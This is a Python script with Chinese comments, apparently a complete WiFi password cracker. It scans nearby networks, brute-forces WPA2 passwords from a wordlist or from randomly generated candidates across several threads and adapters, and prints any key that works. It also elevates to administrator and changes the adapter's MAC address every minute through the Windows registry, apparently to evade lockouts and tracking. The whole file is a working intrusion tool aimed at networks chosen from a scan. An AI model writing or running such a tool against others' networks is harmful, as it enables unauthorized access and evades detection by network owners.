import sys
import os
import pywifi  # WiFi操作库
import time    # 时间控制
import threading  # 多线程
import random  # 随机数生成（用于MAC地址）
import subprocess  # 调用系统命令

# 检查并请求管理员权限（仅限Windows）
if os.name == 'nt':
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("检测到未以管理员身份运行，正在请求管理员权限...")
            params = ' '.join([f'"{x}"' for x in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
    except Exception as e:
        print(f"管理员权限检测失败: {e}")
        sys.exit(1)


# 初始化WiFi对象并获取所有无线网卡接口
wifi = pywifi.PyWiFi()
interfaces = wifi.interfaces()



# 列出所有可用无线网卡
print("可用的无线网卡：")
for idx, iface in enumerate(interfaces):
    print(f"{idx}: {iface.name()}")

# 选择要使用的无线网卡（支持多选，逗号分隔）
choices = input("请选择要使用的无线网卡编号（可用逗号分隔多个）: ")
choice_list = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit() and int(x.strip()) < len(interfaces)]
if not choice_list:
    print("未选择有效网卡，程序退出。")
    sys.exit(1)
selected_interfaces = [interfaces[i] for i in choice_list]
print("你选择的网卡:", ', '.join([iface.name() for iface in selected_interfaces]))
for iface in selected_interfaces:
    print(f"接口 {iface.name()} 状态: {iface.status()}")


# 多网卡扫描，合并所有WiFi
wifiList = []
for interface in selected_interfaces:
    max_retries = 3
    retry_count = 0
    while retry_count < max_retries:
        try:
            interface.scan()
            print(f'[{interface.name()}] 扫描WiFi中，请稍后………………')
            time.sleep(10)
            results = interface.scan_results()
            if results:
                wifiList.extend(results)
                print(f'[{interface.name()}] 扫描完成！')
                break
            else:
                print(f'[{interface.name()}] 扫描失败，正在重试……')
                retry_count += 1
        except ValueError as e:
            print(f'[{interface.name()}] 获取WiFi列表时发生错误: {e}')
            wifiList = []
            break
    else:
        print(f'[{interface.name()}] 多次扫描失败，请检查无线网卡或环境。')


# 合并去重（按SSID）并整理WiFi信号强度和名称，按信号强度排序
ssid_dict = {}
for w in wifiList:
    ssid = w.ssid.encode('raw_unicode_escape').decode('utf-8')
    if ssid and (ssid not in ssid_dict or (100 + w.signal) > ssid_dict[ssid][0]):
        ssid_dict[ssid] = (100 + w.signal, ssid)
wifi_signal_and_name_list = sorted(ssid_dict.values(), key=lambda i: i[0], reverse=True)

# 打印所有扫描到的WiFi
index = 0
while index < len(wifi_signal_and_name_list):
    print('%s\t\t\t%s\t\t\t%s' % (index, wifi_signal_and_name_list[index][0], wifi_signal_and_name_list[index][1]))
    index += 1
print('\n' + '*' * 50)



# 选择密码来源：密码本或随机生成
mode = input("请选择密码模式（1-使用密码本，2-随机生成密码）: ").strip()
while mode not in ('1', '2'):
    mode = input("输入有误，请重新选择（1-使用密码本，2-随机生成密码）: ").strip()


# 选择要破解的WiFi编号（支持多选，逗号分隔）
wifi_indices = input("请选择要破解的WiFi编号（可用逗号分隔多个）: ")
wifi_index_list = [int(x.strip()) for x in wifi_indices.split(',') if x.strip().isdigit() and int(x.strip()) < len(wifi_signal_and_name_list)]
if not wifi_index_list:
    print("未选择有效WiFi，程序退出。")
    sys.exit(1)
target_ssids = [wifi_signal_and_name_list[i][1] for i in wifi_index_list]

if mode == '1':
    password_file = input("请输入密码本文件路径: ")
    # 读取密码本
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"无法读取密码本: {e}")
        passwords = []
elif mode == '2':
    # 随机生成密码
    try:
        min_len = int(input("请输入随机密码最小长度（如8）: "))
        max_len = int(input("请输入随机密码最大长度（如12）: "))
        count = int(input("请输入要生成的随机密码数量: "))
        charset = input("请输入密码字符集（如: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789）: ")
        if not charset:
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        passwords = []
        for _ in range(count):
            length = random.randint(min_len, max_len)
            pwd = ''.join(random.choices(charset, k=length))
            passwords.append(pwd)
        print(f"已生成{len(passwords)}个随机密码。")
    except Exception as e:
        print(f"随机密码生成失败: {e}")
        passwords = []


# 多线程破解相关事件和锁
found_event = threading.Event()  # 任一WiFi破解成功标志
lock = threading.Lock()  # 线程锁，保证多线程安全



# 尝试连接指定密码（多网卡多SSID）
def try_password(interface, ssid, pwd):
    if found_event.is_set():
        return False
    p = pywifi.Profile()
    p.ssid = ssid
    p.auth = pywifi.const.AUTH_ALG_OPEN
    p.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    p.cipher = pywifi.const.CIPHER_TYPE_CCMP
    with lock:
        interface.remove_all_network_profiles()
        p.key = pwd
        tmp_profile = interface.add_network_profile(p)
        interface.connect(tmp_profile)
    time.sleep(3)  # 缩短等待
    if interface.status() == pywifi.const.IFACE_CONNECTED:
        print(f"[SUCCESS] 网卡: {interface.name()} SSID: {ssid} 密码: {pwd}")
        found_event.set()
        interface.disconnect()
        return True
    else:
        interface.disconnect()
        return False



# 线程工作函数，遍历分配到的密码
def worker(interface, ssid, passwords):
    for pwd in passwords:
        if found_event.is_set():
            break
        if try_password(interface, ssid, pwd):
            break


# 生成随机MAC地址
def random_mac():
    return "{:02x}-{:02x}-{:02x}-{:02x}-{:02x}-{:02x}".format(
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )


# 更换网卡MAC地址（Windows，需管理员权限）
def change_mac(interface_name):
    new_mac = random_mac()
    print(f"[MAC] 正在更换MAC地址为: {new_mac}")
    try:
        # 1. 关闭网卡
        subprocess.run(f'netsh interface set interface name="{interface_name}" admin=disable', shell=True, check=True)
        # 2. 修改注册表，找到对应网卡并写入新MAC
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}', 0, winreg.KEY_ALL_ACCESS)
        i = 0
        found = False
        while True:
            try:
                subkey = winreg.EnumKey(key, i)
                subkey_path = r'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\' + subkey
                subkey_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path, 0, winreg.KEY_ALL_ACCESS)
                try:
                    name, _ = winreg.QueryValueEx(subkey_handle, 'NetCfgInstanceId')
                    if interface_name in name:
                        winreg.SetValueEx(subkey_handle, 'NetworkAddress', 0, winreg.REG_SZ, new_mac.replace('-', ''))
                        found = True
                        break
                except Exception:
                    pass
                finally:
                    winreg.CloseKey(subkey_handle)
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
        if not found:
            print("[MAC] 未找到对应网卡注册表项，MAC更换失败。")
        # 3. 启用网卡
        subprocess.run(f'netsh interface set interface name="{interface_name}" admin=enable', shell=True, check=True)
    except Exception as e:
        print(f"[MAC] 更换MAC地址失败: {e}")



# MAC更换线程，每隔一分钟更换一次MAC，直到破解成功
def mac_changer_thread(interface):
    while not found_event.is_set():
        change_mac(interface.name())
        for _ in range(60):
            if found_event.is_set():
                break
            time.sleep(1)



print(f"开始尝试破解WiFi: {', '.join(target_ssids)}")

# 启动每个网卡的MAC更换线程（守护线程，自动后台运行）
mac_threads = []
for interface in selected_interfaces:
    mac_thread = threading.Thread(target=mac_changer_thread, args=(interface,), daemon=True)
    mac_thread.start()
    mac_threads.append(mac_thread)

# 启动多线程破解，每个SSID每个网卡分配线程
num_threads = min(8, len(passwords))  # 限制最大线程数
chunk_size = len(passwords) // num_threads + 1
threads = []
for interface in selected_interfaces:
    for ssid in target_ssids:
        for i in range(num_threads):
            chunk = passwords[i*chunk_size:(i+1)*chunk_size]
            if not chunk:
                continue
            t = threading.Thread(target=worker, args=(interface, ssid, chunk))
            threads.append(t)
            t.start()

# 等待所有破解线程结束
for t in threads:
    t.join()

# 最终结果输出
if not found_event.is_set():
    print("所有密码均未能破解所选WiFi。")